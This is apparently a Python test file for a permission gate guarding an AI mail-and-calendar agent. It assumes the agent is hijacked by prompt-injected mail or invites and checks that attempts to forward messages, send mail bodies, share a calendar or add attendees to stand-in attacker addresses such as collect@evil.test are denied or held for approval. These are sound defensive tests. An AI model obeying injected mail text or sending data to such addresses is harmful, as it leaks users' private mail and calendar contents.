"""Attacks 1-6: a mail asks for a forward; an invite asks to add an outsider or share a link.

The agent in these tests is assumed fully hijacked: it does whatever the injected text says.
What is checked is what the gate lets through, not whether the agent was fooled.
"""

from broker.approvals.base import ApprovalOutcome
from broker.rules.models import Verdict
from tests.conftest import WorldFactory

EXFIL = "collect@evil.test"


def test_01_forward_tool_is_not_offered(world: WorldFactory) -> None:
    w = world(messages=["m_forward", "m_lunch"])
    w.call("read_message", message_id="m_forward")
    for tool in ("forward_message", "forward_mail", "share_calendar", "delete_message"):
        result = w.call(tool, message_id="m_lunch", to=[EXFIL])
        assert result.verdict == Verdict.DENY
    assert w.backend.sent == []
    assert w.approver.requests == []


def test_02_forward_rebuilt_as_send_needs_approval(world: WorldFactory) -> None:
    w = world(messages=["m_forward", "m_lunch"])
    w.call("read_message", message_id="m_forward")
    assert w.session.tainted
    bodies = [w.call("read_message", message_id="m_lunch").data["body"]]
    result = w.call("send_mail", to=[EXFIL], subject="Fwd: migration", body="\n".join(bodies))
    assert result.verdict == Verdict.ASK
    assert not result.ok
    [prompt] = w.approver.requests
    assert prompt.recipients == [EXFIL]
    assert "unknown sender" in prompt.reason
    assert w.backend.sent == []


def test_03_forward_send_times_out_and_is_denied(world: WorldFactory) -> None:
    w = world(messages=["m_forward"], default=ApprovalOutcome.TIMEOUT)
    w.call("read_message", message_id="m_forward")
    result = w.call("send_mail", to=[EXFIL], subject="Fwd", body="ten messages")
    assert result.approval == ApprovalOutcome.TIMEOUT
    assert not result.ok
    assert w.backend.sent == []


def test_04_invite_asks_to_add_outside_attendee(world: WorldFactory) -> None:
    w = world(events=["e_standup", "e_vendor"])
    w.call("list_events")
    assert w.session.tainted
    assert "outside organizer" in w.session.taint_reason
    result = w.call(
        "create_event",
        title="Standup",
        start="2026-10-27T09:00:00Z",
        end="2026-10-27T09:15:00Z",
        attendees=["me@home.test", "partner@evil.test"],
    )
    assert result.verdict == Verdict.ASK
    [prompt] = w.approver.requests
    assert prompt.recipients == ["me@home.test", "partner@evil.test"]
    assert w.backend.created_events == []


def test_05_invite_asks_to_share_meeting_link(world: WorldFactory) -> None:
    w = world(events=["e_vendor"])
    w.call("list_events")
    link_body = "Join here: https://evil.test/join"
    result = w.call("send_mail", to=["partner@evil.test"], subject="Link", body=link_body)
    assert result.verdict == Verdict.ASK
    [prompt] = w.approver.requests
    assert prompt.recipients == ["partner@evil.test"]
    assert prompt.body_preview == link_body
    assert w.call("share_calendar", to=["partner@evil.test"]).verdict == Verdict.DENY
    assert w.backend.sent == []


def test_06_cautious_profile_denies_tainted_outside_invite(world: WorldFactory) -> None:
    w = world(profile="cautious", events=["e_vendor"])
    w.call("list_events")
    result = w.call("create_event", title="x", start="s", end="e", attendees=["partner@evil.test"])
    assert result.verdict == Verdict.DENY
    assert w.approver.requests == []
    assert w.backend.created_events == []
